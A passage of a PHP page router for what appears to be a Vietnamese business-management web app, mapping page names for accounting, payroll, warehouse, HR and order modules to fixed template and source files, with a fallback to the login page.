		$template->assign_file("file_include", $root_path . "templates/groupproduct.tpl");
		include($root_path . "source/groupproduct.php");
		break;
	case "product":
		$template->assign_file("file_include", $root_path . "templates/product.tpl");
		include($root_path . "source/product.php");
		break;
	case "dieukhoan":
		$template->assign_file("file_include", $root_path . "templates/dieukhoan.tpl");
		include($root_path . "source/dieukhoan.php");
		break;
	case "phanquyen":
		$template->assign_file("file_include", $root_path . "templates/phanquyen.tpl");
		include($root_path . "source/phanquyen.php");
		break;
	case "canhbao":
		$template->assign_file("file_include", $root_path . "templates/canhbao.tpl");
		include($root_path . "source/canhbao.php");
		break;
	case "thongtinchuan":
		$template->assign_file("file_include", $root_path . "templates/thongtinchuan.tpl");
		include($root_path . "source/thongtinchuan.php");
		break;
	case "thongtinchuan1":
		$template->assign_file("file_include", $root_path . "templates/thongtinchuan1.tpl");
		include($root_path . "source/thongtinchuan1.php");
		break;

	case "thkinhdoanh":
		$template->assign_file("file_include", $root_path . "templates/tonghopkinhdoanh.tpl");
		include($root_path . "source/tonghopkinhdoanh.php");
		break;
		//\\\\\\\\\\\\\\=================
	case "sochitiet":
		$template->assign_file("file_include", $root_path . "templates/sochitiet.tpl");
		include($root_path . "source/sochitiet.php");
		break;
	case "taikhoan":
		$template->assign_file("file_include", $root_path . "templates/taikhoan.tpl");
		include($root_path . "source/taikhoan.php");
		break;
	case "taikhoannganhang":
		$template->assign_file("file_include", $root_path . "templates/taikhoannganhang.tpl");
		include($root_path . "source/taikhoannganhang.php");
		break;
	case "taikhoanno":
		$template->assign_file("file_include", $root_path . "templates/taikhoan.tpl");
		include($root_path . "source/taikhoan.php");
		break;
	case "taikhoanco":

		$template->assign_file("file_include", $root_path . "templates/taikhoan.tpl");
		include($root_path . "source/taikhoan.php");
		break;


		//=== het titket =====
	case "login":
		$_SESSION["dangnhap"] = "";
		$template->assign_file("file_include", $root_path . "templates/login.tpl");
		include($root_path . "source/login.php");
		break;
	case "tinnoibo":
		$template->assign_file("file_include", $root_path . "templates/tinnoibo.tpl");
		include($root_path . "source/tinnoibo.php");
		break;

	case "thumuc":
		$template->assign_file("file_include", $root_path . "templates/thumuc.tpl");
		include($root_path . "source/thumuc.php");
		break;
	case "thumucchitiet":
		$template->assign_file("file_include", $root_path . "templates/thumucchitiet.tpl");
		include($root_path . "source/thumucchitiet.php");
		break;
	case "fileluutru":
		$template->assign_file("file_include", $root_path . "templates/fileluutru.tpl");
		include($root_path . "source/fileluutru.php");
		break;
	case "main":
		$template->assign_file("file_include", $root_path . "templates/main.tpl");
		include($root_path . "source/main.php");
		break;
	case "listuser":
		$template->assign_file("file_include", $root_path . "templates/listuser.tpl");
		include($root_path . "source/listuser.php");
		break;
	case "team":
		$template->assign_file("file_include", $root_path . "templates/team.tpl");
		include($root_path . "source/team.php");
		break;
	case "room":
		$template->assign_file("file_include", $root_path . "templates/room.tpl");
		include($root_path . "source/room.php");
		break;
	case "roomchitiet":
		$template->assign_file("file_include", $root_path . "templates/roomchitiet.tpl");
		include($root_path . "source/roomchitiet.php");
		break;
	case "luong":
		$template->assign_file("file_include", $root_path . "templates/luong.tpl");
		include($root_path . "source/luong.php");
		break;
	case "phat":
		$template->assign_file("file_include", $root_path . "templates/phat.tpl");
		include($root_path . "source/phat.php");
		break;
	case "thuong":
		$template->assign_file("file_include", $root_path . "templates/thuong.tpl");
		include($root_path . "source/thuong.php");
		break;
	case "ung":
		$template->assign_file("file_include", $root_path . "templates/ung.tpl");
		include($root_path . "source/ung.php");
		break;
	case "quanlyluong":
		$template->assign_file("file_include", $root_path . "templates/quanlyluong.tpl");
		include($root_path . "source/quanlyluong.php");
		break;

	case "quanlycv":
		$template->assign_file("file_include", $root_path . "templates/quanlycv.tpl");
		include($root_path . "source/quanlycv.php");
		break;
	case "baocaocv":
		$template->assign_file("file_include", $root_path . "templates/baocaocv.tpl");
		include($root_path . "source/baocaocv.php");
		break;
	case "hoctap":
		$template->assign_file("file_include", $root_path . "templates/hoctap.tpl");
		include($root_path . "source/hoctap.php");
		break;
	case "tintuc":
		$template->assign_file("file_include", $root_path . "templates/tintuc.tpl");
		include($root_path . "source/tintuc.php");
		break;

	case "doimatkhau":
		$template->assign_file("file_include", $root_path . "templates/changepass.tpl");
		include($root_path . "source/changepass.php");
		break;
	case "xembaocaocv":
		$template->assign_file("file_include", $root_path . "templates/xembaocaocv.tpl");
		include($root_path . "source/xembaocaocv.php");
		break;
	case "tonghop":
		$template->assign_file("file_include", $root_path . "templates/tonghopbaocao.tpl");
		include($root_path . "source/tonghopbaocao.php");
		break;

	case "danhgia":
		$template->assign_file("file_include", $root_path . "templates/danhgia.tpl");
		include($root_path . "source/danhgia.php");
		break;
	case "kiemkho":
		$template->assign_file("file_include", $root_path . "templates/kiemkho.tpl");
		include($root_path . "source/kiemkho.php");
		break;
	case "kiemkhobaocao":
		$template->assign_file("file_include", $root_path . "templates/kiemkhobaocao.tpl");
		include($root_path . "source/kiemkhobaocao.php");
		break;
	case "kiemkhobaocaogop":
		$template->assign_file("file_include", $root_path . "templates/kiemkhobaocaogop.tpl");
		include($root_path . "source/kiemkhobaocaogop.php");
		break;
	case "tonhom":
		$template->assign_file("file_include", $root_path . "templates/tonhom.tpl");
		include($root_path . "source/tonhom.php");
		break;
	case "lydokiem":
		$template->assign_file("file_include", $root_path . "templates/lydokiem.tpl");
		include($root_path . "source/lydokiem.php");
		break;
	case "lydonhap":
		$template->assign_file("file_include", $root_path . "templates/lydonhap.tpl");
		include($root_path . "source/lydonhap.php");
		break;
	case "lydoxuat":
		$template->assign_file("file_include", $root_path . "templates/lydoxuat.tpl");
		include($root_path . "source/lydoxuat.php");
		break;
	case "lydothu":
		$template->assign_file("file_include", $root_path . "templates/lydothu.tpl");
		include($root_path . "source/lydothu.php");
		break;
	case "lydochi":
		$template->assign_file("file_include", $root_path . "templates/lydochi.tpl");
		include($root_path . "source/lydochi.php");
		break;
	case "kho":
		$template->assign_file("file_include", $root_path . "templates/kho.tpl");
		include($root_path . "source/kho.php");
		break;
	case "thongbao":
		$template->assign_file("file_include", $root_path . "templates/thongbao.tpl");
		include($root_path . "source/thongbao.php");
		break;
	case "nhomkh":
		$template->assign_file("file_include", $root_path . "templates/nhomkh.tpl");
		include($root_path . "source/nhomkh.php");
		break;
	case "nhanviendilam":
		$template->assign_file("file_include", $root_path . "templates/nhanviendilam.tpl");
		include($root_path . "source/nhanviendilam.php");
		break;
	case "thuchiketoantudong":
		$template->assign_file("file_include", $root_path . "templates/thuchiketoantudong.tpl");
		include($root_path . "source/thuchiketoantudong.php");
		break;
	case "dinhkhoanthuchi":
		$template->assign_file("file_include", $root_path . "templates/dinhkhoanthuchi.tpl");
		include($root_path . "source/dinhkhoanthuchi.php");
		break;
	case "thuchiktbaocao":
		$template->assign_file("file_include", $root_path . "templates/thuchiktbaocao.tpl");
		include($root_path . "source/thuchiktbaocao.php");
		break;
	case "thuongkthoadon":
		$template->assign_file("file_include", $root_path . "templates/thuongkthoadon.tpl");
		include($root_path . "source/thuongkthoadon.php");
		break;
	case "baolanhvienphi":
		$template->assign_file("file_include", $root_path . "templates/baolanhvienphi.tpl");
		include($root_path . "source/baolanhvienphi.php");
		break;
	case "danhgiakpi":
		$template->assign_file("file_include", $root_path . "templates/danhgiakpi.tpl");
		include($root_path . "source/danhgiakpi.php");
		break;
	case "chitieudanhgiakpi":
		$template->assign_file("file_include", $root_path . "templates/chitieudanhgiakpi.tpl");
		include($root_path . "source/chitieudanhgiakpi.php");
		break;
	case "tinhluongnv":
		$template->assign_file("file_include", $root_path . "templates/tinhluongnv.tpl");
		include($root_path . "source/tinhluongnv.php");
		break;
	case "thongtinluongnv":
		$template->assign_file("file_include", $root_path . "templates/thongtinluongnv.tpl");
		include($root_path . "source/thongtinluongnv.php");
		break;
	case "duyetnghiviec":
		$template->assign_file("file_include", $root_path . "templates/duyetnghiviec.tpl");
		include($root_path . "source/duyetnghiviec.php");
		break;
	case "themdexuat":
		$template->assign_file("file_include", $root_path . "templates/themdexuat.tpl");
		include($root_path . "source/themdexuat.php");
		break;
	case "upanhsanpham":
		$template->assign_file("file_include", $root_path . "templates/upanhsanpham.tpl");
		include($root_path . "source/upanhsanpham.php");
		break;
	case "upanhsanphamnhieu":
		$template->assign_file("file_include", $root_path . "templates/upanhsanphamnhieu.tpl");
		include($root_path . "source/upanhsanphamnhieu.php");
		break;
	case "danhgiasanpham":
		$template->assign_file("file_include", $root_path . "templates/danhgiasanpham.tpl");
		include($root_path . "source/danhgiasanpham.php");
		break;
	case "duyetnghiviec":
		$template->assign_file("file_include", $root_path . "templates/duyetnghiviec.tpl");
		include($root_path . "source/duyetnghiviec.php");
		break;
	case "themnghiviec":
		$template->assign_file("file_include", $root_path . "templates/themnghiviec.tpl");
		include($root_path . "source/themnghiviec.php");
		break;
	case "themduyetbhyt":
		$template->assign_file("file_include", $root_path . "templates/themduyetbhyt.tpl");
		include($root_path . "source/themduyetbhyt.php");
		break;
	case "duyetbhyt":
		$template->assign_file("file_include", $root_path . "templates/duyetbhyt.tpl");
		include($root_path . "source/duyetbhyt.php");
		break;
	case "quetma":
		$template->assign_file("file_include", $root_path . "templates/quetma.tpl");
		include($root_path . "source/quetma.php");
		break;
	case "phieubugio":
		$template->assign_file("file_include", $root_path . "templates/phieubugio.tpl");
		include($root_path . "source/phieubugio.php");
		break;
	case "phieubugioduyet":
		$template->assign_file("file_include", $root_path . "templates/phieubugioduyet.tpl");
		include($root_path . "source/phieubugioduyet.php");
		break;
	case "onlinecuahang":
		$template->assign_file("file_include", $root_path . "templates/onlinecuahang.tpl");
		include($root_path . "source/onlinecuahang.php");
		break;
	case "passdoncuahang":
		$template->assign_file("file_include", $root_path . "templates/passdoncuahang.tpl");
		include($root_path . "source/passdoncuahang.php");
		break;
	case "passdonvanchuyen":
		$template->assign_file("file_include", $root_path . "templates/passdonvanchuyen.tpl");
		include($root_path . "source/passdonvanchuyen.php");
		break;
	case "passdonbaocao":
		$template->assign_file("file_include", $root_path . "templates/passdonbaocao.tpl");
		include($root_path . "source/passdonbaocao.php");
		break;
	case "passdon":
		$template->assign_file("file_include", $root_path . "templates/passdon.tpl");
		include($root_path . "source/passdon.php");
		break;
	case "cuahangbanhangonline":
		$template->assign_file("file_include", $root_path . "templates/cuahangbanhangonline.tpl");
		include($root_path . "source/cuahangbanhangonline.php");
		break;
	case "thuchiktsodudauky":
		$template->assign_file("file_include", $root_path . "templates/thuchiktsodudauky.tpl");
		include($root_path . "source/thuchiktsodudauky.php");
		break;
	case "updatemavandon":
		$template->assign_file("file_include", $root_path . "templates/updatemavandon.tpl");
		include($root_path . "source/updatemavandon.php");
		break;
	case "taomatudong":
		$template->assign_file("file_include", $root_path . "templates/taomatudong.tpl");
		include($root_path . "source/taomatudong.php");
		break;
	case "taoyeucau":
		$template->assign_file("file_include", $root_path . "templates/taoyeucau.tpl");
		include($root_path . "source/taoyeucau.php");
		break;
	case "phieuxuly":
		$template->assign_file("file_include", $root_path . "templates/phieuxuly.tpl");
		include($root_path . "source/phieuxuly.php");
		break;
	case "yeucaucapnhat":
		$template->assign_file("file_include", $root_path . "templates/yeucaucapnhat.tpl");
		include($root_path . "source/yeucaucapnhat.php");
		break;
	case "upanhsanphamnhieu":
		$template->assign_file("file_include", $root_path . "templates/upanhsanphamnhieu.tpl");
		include($root_path . "source/upanhsanphamnhieu.php");
		break;
	case "xuatkhotong":
		$template->assign_file("file_include", $root_path . "templates/xuatkhotong.tpl");
		include($root_path . "source/xuatkhotong.php");
		break;
	case "taisannhapmoi":
		$template->assign_file("file_include", $root_path . "templates/taisannhapmoi.tpl");
		include($root_path . "source/taisannhapmoi.php");
		break;
	case "imageuser":
		$template->assign_file("file_include", $root_path . "templates/facetrain.tpl");
		// include($root_path . "source/taisannhapmoi.php");
		break;
	case "ung":
		$template->assign_file("file_include", $root_path . "templates/ung.tpl");
		include($root_path . "source/ung.php");
		break;
	case "phat":
		$template->assign_file("file_include", $root_path . "templates/phat.tpl");
		include($root_path . "source/phat.php");
		break;
	case "thuong":
		$template->assign_file("file_include", $root_path . "templates/thuong.tpl");
		include($root_path . "source/thuong.php");
		break;
	case "tinhluongnv":
		$template->assign_file("file_include", $root_path . "templates/tinhluongnv.tpl");
		include($root_path . "source/tinhluongnv.php");
		break;
	default:
		$_SESSION["dangnhap"] = "";
		$template->assign_file("file_include", $root_path . "templates/login.tpl");
		include($root_path . "source/login.php");
		break;
}

//===================================================================

//===================================================================	
//--------------------------------------------------------------------------

//			$sql = "Select value From $data->table_table_config table_config where ID ='11'";
//		$result = $data->query($sql);
//		$result_news = $data->fetch_array($result);
//	$template->assign("title",$result_news["value"]);				
//--------------------------------------------------------------------------
$template->parse("main");
$template->out("main");
 // $data->closedata() ;
